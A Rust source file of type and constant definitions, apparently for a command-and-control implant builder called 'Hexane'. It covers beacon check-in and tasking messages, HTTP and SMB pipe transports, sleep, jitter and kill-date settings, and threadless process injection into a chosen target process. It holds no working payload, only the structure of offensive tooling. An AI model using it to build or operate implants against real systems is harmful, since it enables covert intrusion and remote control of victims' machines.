use clap::Parser;
use serde::{Deserialize, Serialize};

const MINGW:                &str = "x86_64-w64-mingw32-g++";
const OBJCOPY:              &str = "objcopy";
const WINDRES:              &str = "windres";
const STRIP:                &str = "strip";
const NASM:                 &str = "nasm";
const LINKER:               &str = "ld";

const NETWORK_HTTP:         u32 = 0x00000001;
const NETWORK_PIPE:         u32 = 0x00000002;

const TYPE_CHECKIN:         u32 = 0x7FFFFFFF;
const TYPE_TASKING:         u32 = 0x7FFFFFFE;
const TYPE_RESPONSE:        u32 = 0x7FFFFFFD;
const TYPE_SEGMENT:         u32 = 0x7FFFFFFC;

const COMMAND_DIR:          u32 = 0x00000001;
const COMMAND_MODS:         u32 = 0x00000002;
const COMMAND_NO_JOB:       u32 = 0x00000003;
const COMMAND_SHUTDOWN:     u32 = 0x00000004;
const COMMAND_UPDATE_PEER:  u32 = 0x00000005;

#[derive(Debug)]
pub struct Message {
    pub(crate) msg_type: String,
    pub(crate) msg: String,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "lowercase")]
pub enum NetworkType {
    Http,
    Smb,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(untagged)]
pub enum NetworkOptions {
    Http(Http),
    Smb(Smb),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Network {
    pub r#type:     NetworkType,
    pub options:    NetworkOptions,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Smb {
    pub(crate) egress_peer: String,
    pub(crate) egress_pipe: Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Http {
    pub(crate) address:    String,
    pub(crate) port:       u16,
    pub(crate) endpoints:  Vec<String>,
    pub(crate) domain:     Option<String>,
    pub(crate) useragent:  Option<String>,
    pub(crate) headers:    Option<Vec<String>>,
    pub(crate) proxy:      Option<Proxy>,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(rename_all = "lowercase")]
pub enum InjectionType {
    Threadless,
    Threadpool,
}

#[derive(Serialize, Deserialize, Debug)]
#[serde(untagged)]
pub enum InjectionOptions {
    Threadless(Threadless),
    Threadpool(Threadpool),
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Injection {
    pub r#type: InjectionType,
    pub options: InjectionOptions,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Threadless {
    pub(crate) target_process:     String,
    pub(crate) target_module:      String,
    pub(crate) target_function:    String,
    pub(crate) loader_assembly:    String,
    pub(crate) execute_object:     String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Threadpool{
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Config {
    pub(crate) debug:          bool,
    pub(crate) encrypt:        bool,
    pub(crate) architecture:   String,
    pub(crate) hostname:       String,
    pub(crate) working_hours:  Option<String>,
    pub(crate) killdate:       Option<String>,
    pub(crate) sleeptime:      u32,
    pub(crate) jitter:         u32,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Builder {
    pub(crate) output_name:            String,
    pub(crate) root_directory:         String,
    pub(crate) linker_script:          Option<String>,
    pub(crate) loaded_modules:         Option<Vec<String>>,
    pub(crate) dependencies:           Option<Vec<String>>,
    pub(crate) include_directories:    Option<Vec<String>>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Loader {
    pub(crate) root_directory: String,
    pub(crate) linker_script:  String,
    pub(crate) rsrc_script:    String,
    pub(crate) injection:      Injection,
    pub(crate) sources:        Vec<String>,
    pub(crate) dependencies:   Option<Vec<String>>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct Proxy {
    pub(crate) address:    String,
    pub(crate) proto:      String,
    pub(crate) port:       u16,
    pub(crate) username:   Option<String>,
    pub(crate) password:   Option<String>,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct JsonData {
    pub(crate) config:  Config,
    pub(crate) network: Network,
    pub(crate) builder: Builder,
    pub(crate) loader:  Option<Loader>,
}

#[derive(Debug)]
pub struct MessageParser {
    pub(crate) endian:     u8,
    pub(crate) peer_id:    u32,
    pub(crate) task_id:    u32,
    pub(crate) msg_type:   u32,
    pub(crate) msg_length: u32,
    pub(crate) msg_buffer: Vec<u8>,
}

#[derive(Debug)]
pub struct Compiler {
    pub(crate) file_extension:     String,
    pub(crate) build_directory:    String,
    pub(crate) compiler_flags:     String,
}

#[derive(Debug)]
pub struct UserSession {
    pub(crate) username: String,
    pub(crate) is_admin: bool,
}

#[derive(Debug)]
pub struct Hexane {
    pub(crate) current_taskid:  u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,

    pub(crate) crypt_key:       Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config_data:     Vec<u8>,
    pub(crate) network_type:    u32,
    pub(crate) active:          bool,

    pub(crate) main:            Config,
    pub(crate) compiler:        Compiler,
    pub(crate) network:         Network,
    pub(crate) builder:         Builder,
    pub(crate) loader:          Option<Loader>,
    pub(crate) user_session:    UserSession,
}
